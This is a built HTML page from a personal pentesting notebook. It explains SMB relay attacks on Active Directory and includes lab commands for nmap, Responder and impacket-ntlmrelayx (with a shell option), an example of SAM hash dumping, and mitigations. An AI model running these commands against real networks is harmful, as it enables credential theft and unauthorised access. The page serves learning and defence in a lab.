@@ -1,0 +1,549 @@
+
+<!DOCTYPE html>
+
+
+<html lang="en" data-content_root="" >
+
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <title>SMB Relay &#8212; MyHackBook</title>
+  
+  
+  
+  <script data-cfasync="false">
+    document.documentElement.dataset.mode = localStorage.getItem("mode") || "";
+    document.documentElement.dataset.theme = localStorage.getItem("theme") || "";
+  </script>
+  
+  <!-- Loaded before other Sphinx assets -->
+  <link href="../../../_static/styles/theme.css?digest=dfe6caa3a7d634c4db9b" rel="stylesheet" />
+<link href="../../../_static/styles/bootstrap.css?digest=dfe6caa3a7d634c4db9b" rel="stylesheet" />
+<link href="../../../_static/styles/pydata-sphinx-theme.css?digest=dfe6caa3a7d634c4db9b" rel="stylesheet" />
+
+  
+  <link href="../../../_static/vendor/fontawesome/6.5.2/css/all.min.css?digest=dfe6caa3a7d634c4db9b" rel="stylesheet" />
+  <link rel="preload" as="font" type="font/woff2" crossorigin href="../../../_static/vendor/fontawesome/6.5.2/webfonts/fa-solid-900.woff2" />
+<link rel="preload" as="font" type="font/woff2" crossorigin href="../../../_static/vendor/fontawesome/6.5.2/webfonts/fa-brands-400.woff2" />
+<link rel="preload" as="font" type="font/woff2" crossorigin href="../../../_static/vendor/fontawesome/6.5.2/webfonts/fa-regular-400.woff2" />
+
+    <link rel="stylesheet" type="text/css" href="../../../_static/pygments.css?v=a746c00c" />
+    <link rel="stylesheet" type="text/css" href="../../../_static/styles/sphinx-book-theme.css?v=eba8b062" />
+  
+  <!-- Pre-loaded scripts that we'll load fully later -->
+  <link rel="preload" as="script" href="../../../_static/scripts/bootstrap.js?digest=dfe6caa3a7d634c4db9b" />
+<link rel="preload" as="script" href="../../../_static/scripts/pydata-sphinx-theme.js?digest=dfe6caa3a7d634c4db9b" />
+  <script src="../../../_static/vendor/fontawesome/6.5.2/js/all.min.js?digest=dfe6caa3a7d634c4db9b"></script>
+
+    <script data-url_root="../../../" id="documentation_options" src="../../../_static/documentation_options.js?v=a75df0fd"></script>
+    <script src="../../../_static/doctools.js?v=888ff710"></script>
+    <script src="../../../_static/sphinx_highlight.js?v=4825356b"></script>
+    <script src="../../../_static/scripts/sphinx-book-theme.js?v=887ef09a"></script>
+    <script>DOCUMENTATION_OPTIONS.pagename = 'Active Directory/attacking-ad/initial-attack-vectors/smb-relay';</script>
+    <link rel="index" title="Index" href="../../../genindex.html" />
+    <link rel="search" title="Search" href="../../../search.html" />
+    <link rel="next" title="IPv6 Attacks" href="ipv6-attacks.html" />
+    <link rel="prev" title="LLMNR Poisoning" href="llmnr-poisoning.html" />
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <meta name="docsearch:language" content="en"/>
+  </head>
+  
+  
+  <body data-bs-spy="scroll" data-bs-target=".bd-toc-nav" data-offset="180" data-bs-root-margin="0px 0px -60%" data-default-mode="">
+
+  
+  
+  <div id="pst-skip-link" class="skip-link d-print-none"><a href="#main-content">Skip to main content</a></div>
+  
+  <div id="pst-scroll-pixel-helper"></div>
+  
+  <button type="button" class="btn rounded-pill" id="pst-back-to-top">
+    <i class="fa-solid fa-arrow-up"></i>Back to top</button>
+
+  
+  <input type="checkbox"
+          class="sidebar-toggle"
+          id="pst-primary-sidebar-checkbox"/>
+  <label class="overlay overlay-primary" for="pst-primary-sidebar-checkbox"></label>
+  
+  <input type="checkbox"
+          class="sidebar-toggle"
+          id="pst-secondary-sidebar-checkbox"/>
+  <label class="overlay overlay-secondary" for="pst-secondary-sidebar-checkbox"></label>
+  
+  <div class="search-button__wrapper">
+    <div class="search-button__overlay"></div>
+    <div class="search-button__search-container">
+<form class="bd-search d-flex align-items-center"
+      action="../../../search.html"
+      method="get">
+  <i class="fa-solid fa-magnifying-glass"></i>
+  <input type="search"
+         class="form-control"
+         name="q"
+         id="search-input"
+         placeholder="Search..."
+         aria-label="Search..."
+         autocomplete="off"
+         autocorrect="off"
+         autocapitalize="off"
+         spellcheck="false"/>
+  <span class="search-button__kbd-shortcut"><kbd class="kbd-shortcut__modifier">Ctrl</kbd>+<kbd>K</kbd></span>
+</form></div>
+  </div>
+
+  <div class="pst-async-banner-revealer d-none">
+  <aside id="bd-header-version-warning" class="d-none d-print-none" aria-label="Version warning"></aside>
+</div>
+
+  
+    <header class="bd-header navbar navbar-expand-lg bd-navbar d-print-none">
+    </header>
+  
+
+  <div class="bd-container">
+    <div class="bd-container__inner bd-page-width">
+      
+      
+      
+      <div class="bd-sidebar-primary bd-sidebar">
+        
+
+  
+  <div class="sidebar-header-items sidebar-primary__section">
+    
+    
+    
+    
+  </div>
+  
+    <div class="sidebar-primary-items__start sidebar-primary__section">
+        <div class="sidebar-primary-item">
+
+  
+    
+  
+
+<a class="navbar-brand logo" href="../../../index.html">
+  
+  
+  
+  
+  
+    
+    
+      
+    
+    
+    <img src="../../../_static/Logo.png" class="logo__image only-light" alt="MyHackBook - Home"/>
+    <script>document.write(`<img src="../../../_static/Logo.png" class="logo__image only-dark" alt="MyHackBook - Home"/>`);</script>
+  
+  
+</a></div>
+        <div class="sidebar-primary-item">
+
+ <script>
+ document.write(`
+   <button class="btn search-button-field search-button__button" title="Search" aria-label="Search" data-bs-placement="bottom" data-bs-toggle="tooltip">
+    <i class="fa-solid fa-magnifying-glass"></i>
+    <span class="search-button__default-text">Search</span>
+    <span class="search-button__kbd-shortcut"><kbd class="kbd-shortcut__modifier">Ctrl</kbd>+<kbd class="kbd-shortcut__modifier">K</kbd></span>
+   </button>
+ `);
+ </script></div>
+        <div class="sidebar-primary-item"><nav class="bd-links bd-docs-nav" aria-label="Main">
+    <div class="bd-toc-item navbar-nav active">
+        <p aria-level="2" class="caption" role="heading"><span class="caption-text">Contents</span></p>
+<ul class="current nav bd-sidenav">
+<li class="toctree-l1"><a class="reference internal" href="../../../start-here.html">-&gt; Start Here</a></li>
+<li class="toctree-l1 current active has-children"><a class="reference internal" href="../../index.html">Active Directory</a><details open="open"><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="../../basics.html">Basics</a></li>
+<li class="toctree-l2 current active has-children"><a class="reference internal" href="../index.html">Attacking AD</a><details open="open"><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul class="current">
+<li class="toctree-l3 current active has-children"><a class="reference internal" href="index.html">Initial Attack Vectors</a><details open="open"><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul class="current">
+<li class="toctree-l4"><a class="reference internal" href="llmnr-poisoning.html">LLMNR Poisoning</a></li>
+<li class="toctree-l4 current active"><a class="current reference internal" href="#">SMB Relay</a></li>
+<li class="toctree-l4"><a class="reference internal" href="ipv6-attacks.html">IPv6 Attacks</a></li>
+<li class="toctree-l4"><a class="reference internal" href="passback-attacks.html">Passback Attacks</a></li>
+</ul>
+</details></li>
+</ul>
+</details></li>
+</ul>
+</details></li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../Web%20App%20Pentesting/index.html">Web App Pentesting</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../Web%20App%20Pentesting/xss.html">Cross-Site Scripting (XSS)</a></li>
+</ul>
+</details></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../Scripts%20and%20Tools/index.html">Scripts and Tools</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../Blogs/index.html">Blogs</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../Writeups/index.html">Writeups</a></li>
+</ul>
+
+    </div>
+</nav></div>
+    </div>
+  
+  
+  <div class="sidebar-primary-items__end sidebar-primary__section">
+  </div>
+  
+  <div id="rtd-footer-container"></div>
+
+
+      </div>
+      
+      <main id="main-content" class="bd-main" role="main">
+        
+        
+
+<div class="sbt-scroll-pixel-helper"></div>
+
+          <div class="bd-content">
+            <div class="bd-article-container">
+              
+              <div class="bd-header-article d-print-none">
+<div class="header-article-items header-article__inner">
+  
+    <div class="header-article-items__start">
+      
+        <div class="header-article-item"><button class="sidebar-toggle primary-toggle btn btn-sm" title="Toggle primary sidebar" data-bs-placement="bottom" data-bs-toggle="tooltip">
+  <span class="fa-solid fa-bars"></span>
+</button></div>
+      
+    </div>
+  
+  
+    <div class="header-article-items__end">
+      
+        <div class="header-article-item">
+
+<div class="article-header-buttons">
+
+
+<a href="https://github.com/RayenManai/MyHackBook" target="_blank"
+   class="btn btn-sm btn-source-repository-button"
+   title="Source repository"
+   data-bs-placement="bottom" data-bs-toggle="tooltip"
+>
+  
+
+<span class="btn__icon-container">
+  <i class="fab fa-github"></i>
+  </span>
+
+</a>
+
+
+
+
+
+
+<div class="dropdown dropdown-download-buttons">
+  <button class="btn dropdown-toggle" type="button" data-bs-toggle="dropdown" aria-expanded="false" aria-label="Download this page">
+    <i class="fas fa-download"></i>
+  </button>
+  <ul class="dropdown-menu">
+      
+      
+      
+      <li><a href="../../../_sources/Active Directory/attacking-ad/initial-attack-vectors/smb-relay.md" target="_blank"
+   class="btn btn-sm btn-download-source-button dropdown-item"
+   title="Download source file"
+   data-bs-placement="left" data-bs-toggle="tooltip"
+>
+  
+
+<span class="btn__icon-container">
+  <i class="fas fa-file"></i>
+  </span>
+<span class="btn__text-container">.md</span>
+</a>
+</li>
+      
+      
+      
+      
+      <li>
+<button onclick="window.print()"
+  class="btn btn-sm btn-download-pdf-button dropdown-item"
+  title="Print to PDF"
+  data-bs-placement="left" data-bs-toggle="tooltip"
+>
+  
+
+<span class="btn__icon-container">
+  <i class="fas fa-file-pdf"></i>
+  </span>
+<span class="btn__text-container">.pdf</span>
+</button>
+</li>
+      
+  </ul>
+</div>
+
+
+
+
+<button onclick="toggleFullScreen()"
+  class="btn btn-sm btn-fullscreen-button"
+  title="Fullscreen mode"
+  data-bs-placement="bottom" data-bs-toggle="tooltip"
+>
+  
+
+<span class="btn__icon-container">
+  <i class="fas fa-expand"></i>
+  </span>
+
+</button>
+
+
+
+<script>
+document.write(`
+  <button class="btn btn-sm nav-link pst-navbar-icon theme-switch-button" title="light/dark" aria-label="light/dark" data-bs-placement="bottom" data-bs-toggle="tooltip">
+    <i class="theme-switch fa-solid fa-sun fa-lg" data-mode="light"></i>
+    <i class="theme-switch fa-solid fa-moon fa-lg" data-mode="dark"></i>
+    <i class="theme-switch fa-solid fa-circle-half-stroke fa-lg" data-mode="auto"></i>
+  </button>
+`);
+</script>
+
+
+<script>
+document.write(`
+  <button class="btn btn-sm pst-navbar-icon search-button search-button__button" title="Search" aria-label="Search" data-bs-placement="bottom" data-bs-toggle="tooltip">
+    <i class="fa-solid fa-magnifying-glass fa-lg"></i>
+  </button>
+`);
+</script>
+<button class="sidebar-toggle secondary-toggle btn btn-sm" title="Toggle secondary sidebar" data-bs-placement="bottom" data-bs-toggle="tooltip">
+    <span class="fa-solid fa-list"></span>
+</button>
+</div></div>
+      
+    </div>
+  
+</div>
+</div>
+              
+              
+
+<div id="jb-print-docs-body" class="onlyprint">
+    <h1>SMB Relay</h1>
+    <!-- Table of contents -->
+    <div id="print-main-content">
+        <div id="jb-print-toc">
+            
+            <div>
+                <h2> Contents </h2>
+            </div>
+            <nav aria-label="Page">
+                <ul class="visible nav section-nav flex-column">
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#what-is-smb">What is SMB?</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#what-can-go-wrong-here">What can go wrong here?</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#attack-requirements">Attack Requirements</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#smb-relay-in-ad">SMB Relay in AD</a><ul class="nav section-nav flex-column">
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#step-1-identifying-workstations-without-smb-signing-enforced">Step 1: Identifying workstations without SMB Signing Enforced</a></li>
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#step-2-setting-up-the-attack">Step 2: Setting up the attack</a></li>
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#step-3-an-event-occurs-and-credentials-get-relayed">Step 3: An Event Occurs and Credentials Get Relayed</a></li>
+</ul>
+</li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#mitigations">Mitigations</a><ul class="nav section-nav flex-column">
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#references">References</a></li>
+</ul>
+</li>
+</ul>
+            </nav>
+        </div>
+    </div>
+</div>
+
+              
+                
+<div id="searchbox"></div>
+                <article class="bd-article">
+                  
+  <section id="smb-relay">
+<h1>SMB Relay<a class="headerlink" href="#smb-relay" title="Permalink to this heading">#</a></h1>
+<section id="what-is-smb">
+<h2>What is SMB?<a class="headerlink" href="#what-is-smb" title="Permalink to this heading">#</a></h2>
+<p>SMB (Server Message Block) is a network file-sharing protocol primarily used in Windows environments. It allows systems to share files, printers, and other resources over a network and supports authentication to access those resources.</p>
+</section>
+<section id="what-can-go-wrong-here">
+<h2>What can go wrong here?<a class="headerlink" href="#what-can-go-wrong-here" title="Permalink to this heading">#</a></h2>
+<p>An SMB relay attack occurs when an attacker intercepts NTLM authentication traffic intended for one machine and relays it to another without cracking the credentials. Instead of capturing hashes for offline attacks, the attacker reuses the authentication in real time to gain unauthorized access, often achieving code execution or administrative privileges on the relayed system.</p>
+<p>SMB is vulnerable to relay attacks because NTLM authentication does not bind the client’s authentication attempt to the intended server. Without SMB signing, the protocol does not verify the integrity and authenticity of the messages, allowing attackers to insert themselves into the authentication process</p>
+</section>
+<section id="attack-requirements">
+<h2>Attack Requirements<a class="headerlink" href="#attack-requirements" title="Permalink to this heading">#</a></h2>
+<p>SMB signing must be disabled or not enforced on the target system, the relayed user must have local administrative rights for meaningful impact, and credentials cannot be relayed back to the machine they originated from. Since NTLM is reused directly, password strength has no effect on the attack’s success. Notably, most Windows workstations by default do not enforce SMB signing, making them susceptible</p>
+</section>
+<section id="smb-relay-in-ad">
+<h2>SMB Relay in AD<a class="headerlink" href="#smb-relay-in-ad" title="Permalink to this heading">#</a></h2>
+<section id="step-1-identifying-workstations-without-smb-signing-enforced">
+<h3>Step 1: Identifying workstations without SMB Signing Enforced<a class="headerlink" href="#step-1-identifying-workstations-without-smb-signing-enforced" title="Permalink to this heading">#</a></h3>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">--</span><span class="n">script</span><span class="o">=</span><span class="n">smb2</span><span class="o">-</span><span class="n">security</span><span class="o">-</span><span class="n">mode</span><span class="o">.</span><span class="n">nse</span> <span class="o">-</span><span class="n">p445</span> <span class="o">&lt;</span><span class="n">target</span><span class="o">-</span><span class="n">ip</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">Pn</span>
+</pre></div>
+</div>
+</section>
+<section id="step-2-setting-up-the-attack">
+<h3>Step 2: Setting up the attack<a class="headerlink" href="#step-2-setting-up-the-attack" title="Permalink to this heading">#</a></h3>
+<p>We first have to disable SMB and HTTP in Responder, as these will be forwarded to nlmrelayx.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">sudo</span> <span class="n">vim</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">responder</span><span class="o">/</span><span class="n">Responder</span><span class="o">.</span><span class="n">conf</span>
+
+<span class="o">--</span> <span class="n">switch</span> <span class="n">SMB</span> <span class="ow">and</span> <span class="n">HTTP</span> <span class="n">Off</span>
+
+<span class="n">sudo</span> <span class="n">responder</span> <span class="o">-</span><span class="n">I</span> <span class="n">eth0</span> <span class="o">-</span><span class="n">dwv</span>
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">impacket</span><span class="o">-</span><span class="n">ntlmrelayx</span> <span class="o">-</span><span class="n">tf</span> <span class="n">targets</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">smb2support</span>
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">--</span> <span class="n">to</span> <span class="n">start</span> <span class="n">a</span> <span class="n">shell</span>
+<span class="n">impacket</span><span class="o">-</span><span class="n">ntlmrelayx</span> <span class="o">-</span><span class="n">tf</span> <span class="n">targets</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">smb2support</span> <span class="o">-</span><span class="n">i</span> <span class="k">for</span> <span class="n">shell</span>
+</pre></div>
+</div>
+</section>
+<section id="step-3-an-event-occurs-and-credentials-get-relayed">
+<h3>Step 3: An Event Occurs and Credentials Get Relayed<a class="headerlink" href="#step-3-an-event-occurs-and-credentials-get-relayed" title="Permalink to this heading">#</a></h3>
+<p>When an event (such as LLMNR poisoning) occurrs, responder will capture this event, pass it to ntlmrelayx, which will relay the credentials to the targets in our targets file.</p>
+<p>In our lab we simulate an event by pointing to the attacker machine ip <code class="docutils literal notranslate"><span class="pre">\\10.0.2.15</span></code> on THEPUNISHER fcastle machine (fcastle is admin on SPIDERMAN so we can authenticate there and dump the local SAM hashes)</p>
+<p>The SAM (Security Account Manager) is a database in Windows that stores local user account information, including hashed representations of passwords. When attackers “dump the SAM,” they extract these password hashes to attempt cracking or use them in pass-the-hash attacks.</p>
+<p>Each entry in a dumped SAM file typically follows the format:
+username:RID:LM hash:NT hash:::</p>
+<ul class="simple">
+<li><p>Username is the account name (e.g., Administrator, Guest, or a local user).</p></li>
+<li><p>RID (Relative Identifier) is a unique number associated with each account. For example, 500 usually corresponds to the built-in Administrator account, 501 to Guest, and 1000+ to user-created accounts.</p></li>
+<li><p>LM hash is the old LAN Manager hash of the password. In modern Windows systems, LM hashes are usually disabled by default and appear as the placeholder value aad3b435b51404eeaad3b435b51404ee.</p></li>
+<li><p>NT hash is the NTLM hash of the password, derived from the actual user password. This is the primary target for attackers since it can be cracked offline or used directly in authentication attacks.</p></li>
+</ul>
+</section>
+</section>
+<section id="mitigations">
+<h2>Mitigations<a class="headerlink" href="#mitigations" title="Permalink to this heading">#</a></h2>
+<p>Mitigation strategies include enabling and enforcing SMB signing on all systems, disabling NTLM where possible, and using Kerberos as the preferred authentication method.
+Restricting administrative privileges, segmenting networks, and applying the principle of least privilege reduce the value of relayed credentials.</p>
+<section id="references">
+<h3>References<a class="headerlink" href="#references" title="Permalink to this heading">#</a></h3>
+<ul class="simple">
+<li><p><a class="reference external" href="https://tcm-sec.com/smb-relay-attacks-and-how-to-prevent-them/">https://tcm-sec.com/smb-relay-attacks-and-how-to-prevent-them/</a></p></li>
+</ul>
+</section>
+</section>
+</section>
+
+
+                </article>
+              
+
+              
+              
+              
+              
+                <footer class="prev-next-footer d-print-none">
+                  
+<div class="prev-next-area">
+    <a class="left-prev"
+       href="llmnr-poisoning.html"
+       title="previous page">
+      <i class="fa-solid fa-angle-left"></i>
+      <div class="prev-next-info">
+        <p class="prev-next-subtitle">previous</p>
+        <p class="prev-next-title">LLMNR Poisoning</p>
+      </div>
+    </a>
+    <a class="right-next"
+       href="ipv6-attacks.html"
+       title="next page">
+      <div class="prev-next-info">
+        <p class="prev-next-subtitle">next</p>
+        <p class="prev-next-title">IPv6 Attacks</p>
+      </div>
+      <i class="fa-solid fa-angle-right"></i>
+    </a>
+</div>
+                </footer>
+              
+            </div>
+            
+            
+              
+                <div class="bd-sidebar-secondary bd-toc"><div class="sidebar-secondary-items sidebar-secondary__inner">
+
+
+  <div class="sidebar-secondary-item">
+  <div class="page-toc tocsection onthispage">
+    <i class="fa-solid fa-list"></i> Contents
+  </div>
+  <nav class="bd-toc-nav page-toc">
+    <ul class="visible nav section-nav flex-column">
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#what-is-smb">What is SMB?</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#what-can-go-wrong-here">What can go wrong here?</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#attack-requirements">Attack Requirements</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#smb-relay-in-ad">SMB Relay in AD</a><ul class="nav section-nav flex-column">
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#step-1-identifying-workstations-without-smb-signing-enforced">Step 1: Identifying workstations without SMB Signing Enforced</a></li>
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#step-2-setting-up-the-attack">Step 2: Setting up the attack</a></li>
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#step-3-an-event-occurs-and-credentials-get-relayed">Step 3: An Event Occurs and Credentials Get Relayed</a></li>
+</ul>
+</li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#mitigations">Mitigations</a><ul class="nav section-nav flex-column">
+<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#references">References</a></li>
+</ul>
+</li>
+</ul>
+  </nav></div>
+
+</div></div>
+              
+            
+          </div>
+          <footer class="bd-footer-content">
+            
+<div class="bd-footer-content__inner container">
+  
+  <div class="footer-item">
+    
+<p class="component-author">
+By Rayen Manai
+</p>
+
+  </div>
+  
+  <div class="footer-item">
+    
+
+  <p class="copyright">
+    
+      © Copyright 2025, Rayen Manai.
+      <br/>
+    
+  </p>
+
+  </div>
+  
+  <div class="footer-item">
+    
+  </div>
+  
+  <div class="footer-item">
+    
+  </div>
+  
+</div>
+          </footer>
+        
+
+      </main>
+    </div>
+  </div>
+  
+  <!-- Scripts loaded after <body> so the DOM is not blocked -->
+  <script src="../../../_static/scripts/bootstrap.js?digest=dfe6caa3a7d634c4db9b"></script>
+<script src="../../../_static/scripts/pydata-sphinx-theme.js?digest=dfe6caa3a7d634c4db9b"></script>
+
+  <footer class="bd-footer">
+  </footer>
+  </body>
+</html>
